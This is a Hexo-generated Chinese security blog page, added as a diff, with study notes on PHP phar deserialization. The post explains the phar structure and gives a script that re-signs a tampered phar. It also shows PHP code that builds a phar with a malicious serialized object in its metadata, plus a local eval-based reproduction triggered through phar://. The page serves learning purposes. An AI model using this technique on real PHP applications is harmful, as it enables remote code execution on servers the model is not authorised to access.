@@ -1,0 +1,534 @@
+
+
+
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#FFF">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico">
+  <meta http-equiv="Cache-Control" content="no-transform">
+  <meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+<link rel="alternate" type="application/rss+xml" title="welcome to my blog" href="https://hq185187.github.io/rss.xml" />
+<link rel="alternate" type="application/atom+xml" title="welcome to my blog" href="https://hq185187.github.io/atom.xml" />
+<link rel="alternate" type="application/json" title="welcome to my blog" href="https://hq185187.github.io/feed.json" />
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="/css/app.css?v=0.2.5">
+
+  
+  <meta name="keywords" content="java,git,springcloud" />
+
+
+<link rel="canonical" href="https://hq185187.github.io/2023/06/03/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+
+
+
+  <title>
+Phar反序列化学习 |
+不良人天藏星 = welcome to my blog = 不良人总舵</title>
+<meta name="generator" content="Hexo 6.3.0"></head>
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div id="loading">
+    <div class="cat">
+      <div class="body"></div>
+      <div class="head">
+        <div class="face"></div>
+      </div>
+      <div class="foot">
+        <div class="tummy-end"></div>
+        <div class="bottom"></div>
+        <div class="legs left"></div>
+        <div class="legs right"></div>
+      </div>
+      <div class="paw">
+        <div class="hands left"></div>
+        <div class="hands right"></div>
+      </div>
+    </div>
+  </div>
+  <div id="container">
+    <header id="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="inner">
+        <div id="brand">
+          <div class="pjax">
+          
+  <h1 itemprop="name headline">Phar反序列化学习
+  </h1>
+  
+<div class="meta">
+  <span class="item" title="创建时间：2023-06-03 14:32:34">
+    <span class="icon">
+      <i class="ic i-calendar"></i>
+    </span>
+    <span class="text">发表于</span>
+    <time itemprop="dateCreated datePublished" datetime="2023-06-03T14:32:34+08:00">2023-06-03</time>
+  </span>
+  <span class="item" title="本文字数">
+    <span class="icon">
+      <i class="ic i-pen"></i>
+    </span>
+    <span class="text">本文字数</span>
+    <span>1.9k</span>
+    <span class="text">字</span>
+  </span>
+  <span class="item" title="阅读时长">
+    <span class="icon">
+      <i class="ic i-clock"></i>
+    </span>
+    <span class="text">阅读时长</span>
+    <span>2 分钟</span>
+  </span>
+</div>
+
+
+          </div>
+        </div>
+        <nav id="nav">
+  <div class="inner">
+    <div class="toggle">
+      <div class="lines" aria-label="切换导航栏">
+        <span class="line"></span>
+        <span class="line"></span>
+        <span class="line"></span>
+      </div>
+    </div>
+    <ul class="menu">
+      <li class="item title"><a href="/" rel="start">不良人天藏星</a></li>
+    </ul>
+    <ul class="right">
+      <li class="item theme">
+        <i class="ic i-sun"></i>
+      </li>
+      <li class="item search">
+        <i class="ic i-search"></i>
+      </li>
+    </ul>
+  </div>
+</nav>
+
+      </div>
+      <div id="imgs" class="pjax">
+        <ul>
+          <li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1gicmnywqgpj20zk0m8dwx.jpg"></li>
+          <li class="item" data-background-image="https://i.loli.net/2020/10/30/Z5W6r2BSoiThHG1.jpg"></li>
+          <li class="item" data-background-image="https://i.loli.net/2020/10/30/Z5W6r2BSoiThHG1.jpg"></li>
+          <li class="item" data-background-image="https://i.loli.net/2020/10/30/Y1CBXqgeokEs457.jpg"></li>
+          <li class="item" data-background-image="https://i.loli.net/2020/10/30/qAMYEFXxJcKRsiG.gif"></li>
+          <li class="item" data-background-image="https://i.loli.net/2020/10/30/Z5W6r2BSoiThHG1.jpg"></li>
+        </ul>
+      </div>
+    </header>
+    <div id="waves">
+      <svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
+        <defs>
+          <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z" />
+        </defs>
+        <g class="parallax">
+          <use xlink:href="#gentle-wave" x="48" y="0" />
+          <use xlink:href="#gentle-wave" x="48" y="3" />
+          <use xlink:href="#gentle-wave" x="48" y="5" />
+          <use xlink:href="#gentle-wave" x="48" y="7" />
+        </g>
+      </svg>
+    </div>
+    <main>
+      <div class="inner">
+        <div id="main" class="pjax">
+          
+  <div class="article wrap">
+    
+<div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList">
+<i class="ic i-home"></i>
+<span><a href="/">首页</a></span>
+</div>
+
+    <article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN">
+  <link itemprop="mainEntityOfPage" href="https://hq185187.github.io/2023/06/03/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+
+  <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="image" content="/images/avatar.jpg">
+    <meta itemprop="name" content="hq185187">
+    <meta itemprop="description" content="不良人总舵, 不定时更新web安全相关知识">
+  </span>
+
+  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="welcome to my blog">
+  </span>
+
+  <div class="body md" itemprop="articleBody">
+    
+
+    <h3 id="phar"><a class="markdownIt-Anchor" href="#phar">#</a> Phar</h3>
+<p>phar 是 PHP 的压缩文档，类似 Java 的 jar 包，可以把多个文件存放至同一文件，无需解压，PHP 就可以访问并执行内部语句</p>
+<h3 id="phar文件结构"><a class="markdownIt-Anchor" href="#phar文件结构">#</a> phar 文件结构</h3>
+<ol>
+<li>a stub, 是 phar 文件头，这个 stub 就是一个简单的 PHP 文件，它的格式有要求：</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxx&lt;?php xxx; __HALT_COMPILER();?&gt;</span><br></pre></td></tr></table></figure>
+<p><mark>前面的内容不限制，但__HALT_COMPILER () 必须存在</mark></p>
+<ol start="2">
+<li>
+<p>manifest, 压缩文件信息，存储文件的属性，权限等信息<br>
+这里以序列化的形式存储了用户自定义的 Meta-data, 因此是反序列化的攻击点</p>
+</li>
+<li>
+<p>contents，压缩文件内容</p>
+</li>
+<li>
+<p>signature，签名，位于文件末尾<br>
+签证尾部的 01 代表 md5 加密，02 代表 sha1 加密，04 代表 sha256 加密，08 代表 sha512 加密<br>
+当我们修改文件的内容时，签名就会变得无效，这个时候需要更换一个新的签名，脚本：</p>
+</li>
+</ol>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha1</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;test.phar&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    f = file.read() </span><br><span class="line">s = f[:-<span class="number">28</span>] <span class="comment"># 获取要签名的数据</span></span><br><span class="line">h = f[-<span class="number">8</span>:] <span class="comment"># 获取签名类型和GBMB标识</span></span><br><span class="line">newf = s + sha1(s).digest() + h <span class="comment"># 数据 + 签名 + (类型 + GBMB)</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;newtest.phar&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    file.write(newf) <span class="comment"># 写入新文件</span></span><br></pre></td></tr></table></figure>
+<h3 id="phar反序列化"><a class="markdownIt-Anchor" href="#phar反序列化">#</a> Phar 反序列化</h3>
+<h4 id="phar反序列化原因"><a class="markdownIt-Anchor" href="#phar反序列化原因">#</a> phar 反序列化原因</h4>
+<p>phar 文件以序列化的形式存储用户自定义的 Meta-data,PHP 使用 phar_parse_metadata 在解析 meta 数据时，会调用 php_var_unserialize 进行反序列化操作</p>
+<h4 id="条件"><a class="markdownIt-Anchor" href="#条件">#</a> 条件</h4>
+<ol>
+<li>phar 文件能上传到服务器，比如 file_get_contents (),fopen () 等函数</li>
+<li>有可以利用的魔术方法</li>
+<li>文件操作函数的参数可控，”phar“，“/”，“:” 这些字符没有被过滤</li>
+<li>php.ini 的 phar.readonly 选项需要为 Off</li>
+</ol>
+<p>#### 需要利用参数的函数<br>
+ file_get_contents,fopen,file_put_contents,copy 等等，<span class="exturl" data-url="aHR0cHM6Ly9pbWcyMDIyLmNuYmxvZ3MuY29tL2Jsb2cvMTgzNTY1Ny8yMDIyMTAvMTgzNTY1Ny0yMDIyMTAxMzAwMTYyMzIwOS0zOTQ3MDAxOTAucG5n">https://img2022.cnblogs.com/blog/1835657/202210/1835657-20221013001623209-394700190.png</span></p>
+<p>### 生成 phar 文件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&quot;qwq&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;name=<span class="string">&quot;phpinfo();&quot;</span>;</span><br><span class="line"><span class="variable">$phartest</span>=<span class="keyword">new</span> <span class="title function_ invoke__">phar</span>(<span class="string">&#x27;phartest.phar&#x27;</span>,<span class="number">0</span>);<span class="comment">//后缀名必须为phar</span></span><br><span class="line"><span class="variable">$phartest</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();<span class="comment">//开始缓冲 Phar 写操作</span></span><br><span class="line"><span class="variable">$phartest</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>);<span class="comment">//自定义的meta-data存入manifest</span></span><br><span class="line"><span class="variable">$phartest</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER();?&gt;&quot;</span>);<span class="comment">//设置stub，stub是一个简单的php文件。PHP通过stub识别一个文件为PHAR文件，可以利用这点绕过文件上传检测</span></span><br><span class="line"><span class="variable">$phartest</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>,<span class="string">&quot;test&quot;</span>);<span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="variable">$phartest</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();<span class="comment">//停止缓冲对 Phar 归档的写入请求，并将更改保存到磁盘</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>复现：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$phardemo</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;phar://phartest.phar/test.txt&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$phardemo</span>;</span><br></pre></td></tr></table></figure>
+
+  </div>
+
+   <footer>
+
+    <div class="meta">
+  <span class="item">
+    <span class="icon">
+      <i class="ic i-calendar-check"></i>
+    </span>
+    <span class="text">更新于</span>
+    <time title="修改时间：2023-06-03 14:32:58" itemprop="dateModified" datetime="2023-06-03T14:32:58+08:00">2023-06-03</time>
+  </span>
+</div>
+
+      
+
+<div id="copyright">
+<ul>
+  <li class="author">
+    <strong>本文作者： </strong>hq185187 <i class="ic i-at"><em>@</em></i>welcome to my blog
+  </li>
+  <li class="link">
+    <strong>本文链接：</strong>
+    <a href="https://hq185187.github.io/2023/06/03/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="Phar反序列化学习">https://hq185187.github.io/2023/06/03/phar反序列化/</a>
+  </li>
+  <li class="license">
+    <strong>版权声明： </strong>本站所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC96aC1DTg=="><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+  </footer>
+
+</article>
+
+  </div>
+  
+
+<div class="post-nav">
+    <div class="item left">
+      
+
+  <a href="/2023/05/14/LitCTF2023/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;tva3.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1gicmnywqgpj20zk0m8dwx.jpg" title="LitCTF2023">
+  <span class="type">上一篇</span>
+  <span class="category"><i class="ic i-flag"></i> </span>
+  <h3>LitCTF2023</h3>
+  </a>
+
+    </div>
+    <div class="item right">
+    </div>
+</div>
+
+  
+  <div class="wrap" id="comments"></div>
+
+
+        </div>
+        <div id="sidebar">
+          
+
+<div class="inner">
+
+  <div class="panels">
+    <div class="inner">
+      <div class="contents panel pjax" data-title="文章目录">
+          <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#phar"><span class="toc-number">1.</span> <span class="toc-text"> Phar</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#phar%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84"><span class="toc-number">2.</span> <span class="toc-text"> phar 文件结构</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">3.</span> <span class="toc-text"> Phar 反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%9F%E5%9B%A0"><span class="toc-number">3.1.</span> <span class="toc-text"> phar 反序列化原因</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9D%A1%E4%BB%B6"><span class="toc-number">3.2.</span> <span class="toc-text"> 条件</span></a></li></ol></li></ol>
+      </div>
+      <div class="related panel pjax" data-title="系列文章">
+      </div>
+      <div class="overview panel" data-title="站点概览">
+        <div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <img class="image" itemprop="image" alt="hq185187"
+      data-src="/images/avatar.jpg">
+  <p class="name" itemprop="name">hq185187</p>
+  <div class="description" itemprop="description">不定时更新web安全相关知识</div>
+</div>
+
+<nav class="state">
+    <div class="item posts">
+      <a href="/archives/">
+        <span class="count">22</span>
+        <span class="name">文章</span>
+      </a>
+    </div>
+    <div class="item categories">
+      <a href="/categories/">
+        <span class="count">2</span>
+        <span class="name">分类</span>
+      </a>
+    </div>
+</nav>
+
+<div class="social">
+      <span class="exturl item github" data-url="aHR0cHM6Ly9naXRodWIuY29tL2hxMTg1MTg3" title="https:&#x2F;&#x2F;github.com&#x2F;hq185187"><i class="ic i-github"></i></span>
+</div>
+
+<ul class="menu">
+  
+    
+  <li class="item">
+    <a href="/" rel="section"><i class="ic i-home"></i>首页</a>
+  </li>
+
+    
+  <li class="item">
+    <a href="/about/" rel="section"><i class="ic i-user"></i>关于</a>
+  </li>
+
+        
+  <li class="item dropdown">
+      <a href="javascript:void(0);"><i class="ic i-feather"></i>文章</a>
+    <ul class="submenu">
+
+        
+  <li class="item">
+    <a href="/archives/" rel="section"><i class="ic i-list-alt"></i>归档</a>
+  </li>
+
+        
+  <li class="item">
+    <a href="/categories/" rel="section"><i class="ic i-th"></i>分类</a>
+  </li>
+
+        
+  <li class="item">
+    <a href="/tags/" rel="section"><i class="ic i-tags"></i>标签</a>
+  </li>
+
+  </ul>
+
+</ul>
+
+      </div>
+    </div>
+  </div>
+
+  <ul id="quick">
+    <li class="prev pjax">
+    </li>
+    <li class="up"><i class="ic i-arrow-up"></i></li>
+    <li class="down"><i class="ic i-arrow-down"></i></li>
+    <li class="next pjax">
+    </li>
+    <li class="percent"></li>
+  </ul>
+</div>
+
+
+        </div>
+        <div class="dimmer"></div>
+      </div>
+    </main>
+    <footer id="footer">
+      <div class="inner">
+        <div class="widgets">
+          
+<div class="rpost pjax">
+  <h2>随机文章</h2>
+  <ul>
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2023/04/26/%E6%97%A0%E5%AD%97%E6%AF%8Drce/" title="无字母数字rce">无字母数字rce</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2023/05/02/SSTI/" title="SSTI总结">SSTI总结</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2023/04/27/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" title="php反序列化漏洞学习">php反序列化漏洞学习</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2023/05/03/request%E5%BA%93/" title="requests学习">requests学习</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/NSSCTF/" title="分类于 NSSCTF精选">NSSCTF精选</a>
+</div>
+
+    <span><a href="/2023/05/12/nssctf2/" title="NSSCTF2">NSSCTF2</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2023/04/28/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" title="命令执行漏洞及绕过方法">命令执行漏洞及绕过方法</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2023/04/27/unserialize-labs/" title="Unserialize-labs">Unserialize-labs</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2023/04/26/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" title="文件包含及伪协议的使用">文件包含及伪协议的使用</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/sql/" title="分类于 SQL注入">SQL注入</a>
+</div>
+
+    <span><a href="/2023/04/28/sqli-labs/" title="Sqli-labs靶场通关">Sqli-labs靶场通关</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2023/04/27/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/" title="正则表达式">正则表达式</a></span>
+  </li>
+
+  </ul>
+</div>
+<div>
+  <h2>最新评论</h2>
+  <ul class="leancloud-recent-comment"></ul>
+</div>
+
+        </div>
+        <div class="status">
+  <div class="copyright">
+    
+    &copy; 2010 – 
+    <span itemprop="copyrightYear">2023</span>
+    <span class="with-love">
+      <i class="ic i-sakura rotate"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">hq185187 @ 不良人天藏星</span>
+  </div>
+  <div class="count">
+    <span class="post-meta-item-icon">
+      <i class="ic i-chart-area"></i>
+    </span>
+    <span title="站点总字数">116k 字</span>
+
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="ic i-coffee"></i>
+    </span>
+    <span title="站点阅读时长">1:45</span>
+  </div>
+  <div class="powered-by">
+    基于 <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span>
+  </div>
+</div>
+
+      </div>
+    </footer>
+  </div>
+<script data-config type="text/javascript">
+  var LOCAL = {
+    path: '2023/06/03/phar反序列化/',
+    favicon: {
+      show: "（●´3｀●）やれやれだぜ",
+      hide: "(´Д｀)大変だ！"
+    },
+    search : {
+      placeholder: "文章搜索",
+      empty: "关于 「 ${query} 」，什么也没搜到",
+      stats: "${time} ms 内找到 ${hits} 条结果"
+    },
+    valine: true,fancybox: true,
+    copyright: '复制成功，转载请遵守 <i class="ic i-creative-commons"></i>BY-NC-SA 协议。',
+    ignores : [
+      function(uri) {
+        return uri.includes('#');
+      },
+      function(uri) {
+        return new RegExp(LOCAL.path+"$").test(uri);
+      }
+    ]
+  };
+</script>
+
+<script src="https://cdn.polyfill.io/v2/polyfill.js"></script>
+
+<script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script>
+
+<script src="/js/app.js?v=0.2.5"></script>
+
+
+
+
+</body>
+</html>
